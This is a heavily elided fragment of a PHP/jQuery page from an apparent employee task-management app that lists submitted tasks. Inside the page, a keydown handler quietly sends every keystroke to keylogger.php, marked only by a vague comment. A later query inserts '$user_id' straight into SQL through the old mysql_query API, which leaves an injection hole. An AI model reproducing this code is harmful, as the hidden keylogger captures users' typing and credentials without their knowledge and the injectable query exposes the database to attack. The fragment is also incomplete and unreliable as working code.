...
?>  
   ...
   <?php
	...
	{
		$query_task = mysql_query("SELECT * FROM submited_task WHERE Status = 'True' order by id desc");
...
$(document).keydown(function(event)
{
	...
	$('#hello').load('keylogger.php?press_key='+keycode+'&page=submited_task');
...
<!-- for key stock.. -->
   ...
   {
	   echo "There is no any submited Task..!";
	}
	?>
   ...
   <!-- end manage employee -->
	...
	{
		$query_task = mysql_query("SELECT * FROM submited_task WHERE Status = 'True' AND User_id = '$user_id' order by id desc");
		$row_task = mysql_fetch_assoc($query_task);
...
<!-- for key stock.. -->
   ...
   {
	   echo "YOU HAD NOT SUBMITED ANY TASK..!!";
	}
	?>
